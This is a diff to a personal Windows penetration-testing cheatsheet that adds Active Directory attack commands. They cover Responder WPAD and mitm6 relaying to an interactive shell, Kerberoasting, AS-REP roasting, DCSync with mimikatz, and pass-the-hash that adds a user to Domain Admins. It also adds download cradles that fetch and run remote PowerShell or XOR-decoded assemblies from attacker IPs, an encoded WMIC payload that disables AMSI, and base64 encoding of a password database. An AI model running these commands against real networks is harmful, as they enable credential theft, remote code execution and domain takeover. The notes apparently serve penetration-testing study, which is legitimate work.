@@ -5,7 +5,11 @@ published: false
 
 # [](#header-1)Windows Notes / Cheatsheet
 
-A place for me to store my notes/tricks for Windows Based Systems
+A place for me to store my notes/tricks for Windows Based Systems. 
+
+
+
+Note: These notes are heavily based off other articles, cheat sheets and guides etc. I just wanted a central place to store the best ones.
 
 ## [](#header-2)Enumeration
 
@@ -237,6 +241,18 @@ IEX($browser.DownloadString('https://server/script.ps1'));
 
 
 
+Powershell Base64
+
+```
+$fileName = "Passwords.kdbx"
+$fileContent = get-content $fileName
+$fileContentBytes = [System.Text.Encoding]::UTF8.GetBytes($fileContent)
+$fileContentEncoded = [System.Convert]::ToBase64String($fileContentBytes)
+$fileContentEncoded | set-content ($fileName + ".b64")
+```
+
+
+
 CertUtil
 
 ```
@@ -290,6 +306,44 @@ auxiliary/spoof/nbns/nbns_response
 #Capture the hashes:
 auxiliary/server/capture/smb
 auxiliary/server/capture/http_ntlm
+```
+
+
+
+Responder WPAD Attack
+
+```
+responder -I eth0 wpad
+
+By default, Windows is configured to search for a Web Proxy Auto-Discovery file when using the internet
+
+Go to internet explorer and search for Google which automatically searches for a WPAD file... 
+
+Then take NTLMv2 hash and NTLM Relay it or send to cracking rig. 
+```
+
+
+
+mitm6
+
+```
+#Use when WPAD attack is not working, this uses IPv6 and DNS to relay creds to a target. 
+
+By default IPV6 should be enabled. 
+git clone https://github.com/fox-it/mitm6.git 
+cd /opt/tools/mitm6
+pip install .
+
+mitm6 -d m0chanAD.local
+
+Now the vuln occurs, Windows prefers IPV6 over IPv4 meaning DNS = controlled by attacker. 
+
+ntlmrelayx.py -wh webserverhostingwpad:80 -t smb://TARGETIP/ -i
+
+-i open's an interactive shell.
+
+Shout out to hausec for this super nice tip.
+
 ```
 
 
@@ -420,6 +474,17 @@ Invoke-CollectionMethod All
 Import .zip to Bloodhound
 
 If you can't exfil the .zip... Find a way ;) I joke, I joke. Output as plain json and copy over manually. It's a big big pain but it works.
+```
+
+
+
+Bloodhound-Python
+
+```
+git clone https://github.com/fox-it/BloodHound.py.git
+cd BloodHound.py/ && pip install .
+
+bloodhound-python -d m0chanAD.local -u m0chan -p Summer2019 -gc DOMAINCONTROLLER.m0chanAD.local -c all
 ```
 
 
@@ -600,7 +665,23 @@ Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAct
 Token Impersonation
 
 ```
+https://github.com/PowerShellMafia/PowerSploit/blob/c7985c9bc31e92bb6243c177d7d1d7e68b6f1816/Exfiltration/Invoke-TokenManipulation.ps1
 
+Invoke-TokenManipulation -ImpersonateUser -Username "lab\domainadminuser"
+Get-Process wininit | Invoke-TokenManipulation -CreateProcess "cmd.exe"
+
+#Tokenvator https://github.com/0xbadjuju/Tokenvator
+
+Reflectively Load it with Powershell, Cobalt, SilentTrinity etc...
+
+```
+
+```
+$wc=New-Object System.Net.WebClient;$wc.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0");$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials
+$k="xxxxxxx";$i=0;[byte[]]$b=([byte[]]($wc.DownloadData("https://xxxxx")))|%{$_-bxor$k[$i++%$k.length]}
+[System.Reflection.Assembly]::Load($b) | Out-Null
+$parameters=@("arg1", "arg2")
+[namespace.Class]::Main($parameters)
 ```
 
 
@@ -613,10 +694,40 @@ Juicy Potato
 
 
 
+Kerberoasting
+
+```
+Get-DomainSPNTicket -Credential $
+
+Invoke-Kerberoast.ps1
+
+python GetUserSPNs.py -request -dc-ip 10.10.14.15 m0chanad.local/serviceaccount
+```
+
+
+
+AS Rep Roasting
+
+```
+#Accounts have to have DONT_REQ_PREAUTH explicitly set for them to be vulnerable
+
+Get-ASRepHash -Domain m0chanAD.local -User victim
+
+Can also use Rebeus (Reflectively Load .NET Assembly.)
+
+.\Rubeus.exe asreproast
+```
+
+
+
 DCSync (Also Post Exploit)
 
 ```
+#Special rights are required to run DCSync. Any member of Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts are able to run DCSync to pull password data. Note that Read-Only Domain Controllers are not  allowed to pull password data for users by default.
 
+mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator
+
+powershell.exe -Version 2 -Exec Bypass /c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.6:8000/Invoke-DCSync.ps1'); Invoke-DCSync -PWDumpFormat"
 ```
 
 
@@ -718,6 +829,37 @@ CrackMapExec
 ```
 
 
+
+WMIC Spawn Process
+
+```
+wmic /node:WS02 /user:DOMAIN\m0chan /password:m0chan process call create "powershell.exe -Enc aQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA2AC8ARwBvAG8AZABuAGkAZwBoAHQALgBwAHMAMQAiACkAKQA7ACAAaQBmACgAWwBCAHkAcABhAHMAcwAuAEEATQBTAEkAXQA6ADoARABpAHMAYQBiAGwAZQAoACkAIAAtAGUAcQAgACIAMAAiACkAIAB7ACAAaQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA2AC8ASABSAEUAdgBlAG4AdABzAC4AcABzADEAIgApACkAIAB9AA=="
+```
+
+
+
+Invoke-WMIExec.ps1
+
+```
+Invoke-WMIExec -Target 10.10.14.14 -Username rweston_da -Hash 3ff61fa259deee15e4042159d
+7b832fa -Command "net user user pass /add /domain"
+
+PS C:\users\epugh_adm\Downloads> Invoke-WMIExec -Target 10.10.120.1 -Username m0chan -Hash 3ff61fa259deee15e4042159d
+7b832fa -Command "net group ""Domain Admins"" m0chan /add /domain"
+```
+
+
+
+
+
+Powershell Invoke-Command (Requires Port 5985)
+
+```
+$secpasswd = ConvertTo-SecureString 'pass' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('m0chan\user', $secpasswd)
+
+Invoke-Command -ComputerName FS01 -Credential $cred -ScriptBlock {whoami}
+```
 
 
 
